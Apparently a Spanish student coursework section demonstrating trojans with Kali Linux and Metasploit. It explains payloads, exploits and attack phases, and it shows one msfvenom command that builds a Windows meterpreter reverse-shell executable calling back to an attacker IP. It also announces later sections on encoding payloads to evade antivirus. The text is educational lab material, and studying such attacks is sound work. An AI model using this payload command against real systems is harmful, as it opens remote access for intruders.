# Demostración práctica: Troyanos
Aun siendo este trabajo eminentemente práctico hemos querido preparar una demostración práctica que sustente lo ya expuesto. Ya que los términos en los que hemos discutido los conceptos anteriores han sido de carácter general hemos optado por hacer lo mismo en esta demostración. Esto es, en vez de buscar un ataque tremendamente específico hemos escogido uno sencillo que nos permita analizar la base teórica de la que hacen uso de una manera clara y concisa.

Con el objetivo de arrojar incluso más luz sobre el malware oculto en general y los troyanos en particular decidimos incluso preparar nuestra propia versión con el objetivo de asentar los conocimientos adquiridos a la vez que relacionábamos el contenido de esta asignatura con el de otras impartidas en el grado.

Creemos que con lo anterior hemos logrado demostrar las características básicas de este tipo de ataques que suelen ser, además, el primer paso en una cadena mucho más compleja.

## Trabajando con Kali
Nuestro objetivo con esta sección no es solo analizar el funcionamiento de los troyanos sino también brindar una pequeña "guía" que permita a cualquiera recrear nuestras pruebas. Es por ello que es necesario describir el sistema con el que se ha generado todo.

Dadas las facilidades que nos ofrece hemos escogido Kali Linux para generar los payloads (más sobre ellos a continuación) y controlar las máquinas comprometidas. Kali es una distribución que usa Linux como kernel y que se basa en el archiconocida Debian. Sobre esta base robusta se ha instalado una gran cantidad de herramientas comunmente empleadas en muchas áreas de la ciberseguridad como puede sern la ingeniería social, la ruptura de contraseñas, auditoría de redes WiFi... En nuestro caso estamos interesados en Metasploit y sus programas relacionados. Metasploit es un framework que nos permite generar ataques contra vulnerabilidades conocidas de una manera clar y rápida. Dado el soporte que ofrece la firma Rapid7, afincada en Boston, nuevas vulnerabilidades y los ataques que las aprovechan se añaden de manera continua. En definitiva, es una herramienta que permite preparar ataques de una manera rápida y que además ofrece una forma clara de continuar con la post-explotación una vez hemos conseguido acceder a la máquina víctima.

Si bien Metasploit es una herramienta tremendamente potente nosotros solo hemos arañado la superficie de la funcionalidad que nos ofrece. En nuestro caso haremos uso del intérprete de órdenes msfconsole y del generador de payloads msfvenom. Ambas herramientas se encuentran instaladas por defecto con lo que no nos las tendremos que ver con la compilación de una suite de herramientas tan extensa...

## Terminología y fases del ataque
Tras haberlo mencionado varias veces creemos que es el momento de esclarecer el significado del payload. El término payload es un anglicismo al que en español nos solemos referir como carga útil en el contexto de las redes que es en el que nos hemos formado. En este ámbito el payload es código que, de ser ejecutado, nos brinda acceso al sistema objetivo. Quizá lo más importante de esta última oración es la palabra "ejecutado". Si bien el payload es el paso anterior a conseguir el acceso que buscamos no vale de nada que esté almacenado en disco; necesitamos que de alguna manera se ejecute.

Para lograr esta ejecución de código arbitraria tenemos que sacar partido a alguna vulnerabilidad. Estas vulnerabilidades son errores en programas o interacciones entre partes del sistema que pueden ser aprovechadas para llevar a cabo acciones a priori no permitidas. La vulnerabilidad por si sola no implica nada, simplemente está ahí, esperando a ser arreglada mediante una actualización. Los atacantes sin embargo intentarán aprovecharla para lograr sus objetivos. En nuestro caso, la ejecución del payload que hemos preparado.

La forma de aprovechar la vulnerabilidad es a través de un exploit. Este exploit suele ser un programa que toma acciones para intentar aprovechar una vulnerabilidad determinada. Teniendo en cuenta la relación entre vulnerabilidades y exploits aprovechamos para señalar por qué es tan importante trabajar con equipos actualizados. Además de funcionalidades nuevas las actualizaciones se encargan de "parchear" vulnerabilidades que se han encontrado para evitar que puedan ser aprovechadas...

En nuestro caso estamos interesados en analizar lo que ocurre una vez se ejecuta el payload, no en la forma de lograrlo. Si aplicamos estos conceptos a raja tabla, en nuestro caso el exploit es el usuario, es quien va a ejecutar el programa que nos dará acceso a su sistema. Una vez analizado el funcionamiento de nuestro troyano entraremos a explicar una forma en la que podemos explotar el lector de PDFs Adobe Acrobat Reader para que no dependamos de el usuario. Creemos que al posponer esta explicación conseguiremos centrar la atención en el malware propiamente dicho mientras que, dada la independencia entre las fases del ataque, no dificultamos seguir esta demostración.

De la discusión anterior se desgrana el proceso común de ataque a un sistema víctima:

- Generar el payload que deseamos ejecutar en la víctima
- Encontrar una vulnerabilidad que podamos aprovechar
- Ejecutar el exploit que saque partido a esa vulnerabilidad para lograr ejecutar el payload
- Ejecutar el payload generado en la víctima para conseguir, en nuestro caso, acceso al sistema
- Emplear el acceso al sistema para lo que se desee: escalada de privilegios, conseguir información...

Con este esquema claro pasamos a detallar cada una de las partes.

## Generando el payload: MSFVENOM
Para facilitar la comprensión de este paso podemos aludir a la formación que hemos adquirido en asignaturas como Sistemas Operativos o Programación en las que estudiamos el proceso que nos lleva desde un archivo fuente *.c a un ejecutable compilado. De manera muy resumida podemos decir que el código fuente pasa por el preprocesador que sustituirá todas las directivas #include <>. A continuación el archivo resultante pasa por el compilador que se encargará de generar archivos objeto *.o para después enlazarlo junto con los demás gracias al enlazador. Tras este último paso llegamos a nuestro ejecutable funcional.

Si observamos este ejecutable con una herramienta como xxd solo veremos una ristra de bytes comprensibles por nuestro equipo, el denominado código máquina. Ahora, si hacemos lo propio con los payloads generados por MSFVENOM veremos que, en efecto, es análogo a un programa compilado. Con esto queremos demostrar que MSFVENOM simplemente nos devuelve ejecutables ya generados. Nosotros podremos controlar qué tipo de payload queremos pero, al final del día, simplemente se nos devuelve un programa listo para ejecutar.

Si bien los lenguajes interpretados como Python están cobrando cada vez más notoriedad en el mundo actual no debemos olvidarnos de las sutilezas que entraña la compilación de programas. Los sistemas operativos se caracterizan por una serie de parámetros como son el kernel o núcleo que emplean o la arquitectura para la que están diseñados. Esto implica que programas generados para una plataforma que se sustente sobre Linux no son compatibles con otros que corran sobre Windows NT, el kernel del sistema operativo homónimo. Bien es verad que existen interfaces del sistema operativo estñandar como POSIX pero no podemos aventurarnos a asegurar que un programa escrito para Windows corra en otro basado en Linux y viceveresa. Lo que es más, dentro de cada una de las familias anteriores distinguimos arquitecturas impuestas por las características físicas de la máquina, siendo las más típicas la de 64 bits (amd64/x64) y la ya algo obsoleta de 32 bits (i386/x86). Al igual que antes un programa compilado para una arquitectura no será compatible con la otra.

Teniendo en cuenta las variables que hemos descrito llegamos a que podemos generar 4 tipos de payloads en función del objetivo que tengamos. Estas 4 variables son:

- Linux - 64 bits
- Linux - 32 bits
- Windows - 64 bits
- Windows - 32 bits

Con esto en mente debemos alterar la salida que nos ofrece MSFVENOM a través de sus opciones para generer el payload deseado. Con el fin de ocultar la complejidad de usar la herramienta directamente hemos escrito un script de bash (la shell por defecto de Kali y otras muchas distribuciones) que se encarga de esto por nosotros. El script en cuestión es `gen_payload.sh`. No obstante, adjuntamos una invocación de ejemplo de MSFVENOM para comentar qué efecto tiene cada una de sus opciones:

```bash
msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=5000 -f exe -o win_pyld.exe
```

Con lo anterior estamos generando el payload `win_pyld.exe`. La arquitectura y plataforma de este programa vienen dadas por las opciones `-a` y `--platform` respectivamente. Consultando los valores pasados vemos que se trata de una máquina que ejecuta la versión de 64 bits de Windows. Asimismo, el tipo de payload seleccionado es `windows/x64/meterpreter/reverse_tcp`. En la siguiente sección comentaremos el funcionamiento de la misma. Dado el payload escogido debemos pasar 2 opciones que se introducirán en el código del mismo. En este caso son la IP (`LHOST`) y el puerto (`LPORT`) de la máquina atacante. En secciones subsiguientes estudiaremos por qué son necesarias estas opciones. Finalmente especificamos el formato del payload generado con la opción `-f`. Dado que el formato estándar de los archivos ejecutables en Windows. Este archivo generado tendrá, ademas del programa propiamente dicho, las instrucciones necesarias para que el loader de Windows lo cargue correctamente.

Como ya comentamos anteriormente, uno de los mecanismos más comunes para detectar malware es la comparación de archivos sospechosos con firmas almacenadas en bases de datos que se han asociado a algún archivo malicioso. Con la orden anterior hemos generado el payload sin intentar ocultarlo de ninguna manera. Más adelante comentaremos como, a traves de un proceso denominado codificación, podemos intentar ocultar este programa malicioso para así inhibir o al menos dificultar el trabajo de los antivirus.

En definitiva, lo que hemos logrado generar es un programa que, de ser ejecutado en la máquina víctima, nos proporcionará acceso desde la máquina atacante.

## Llevando a cabo el ataque
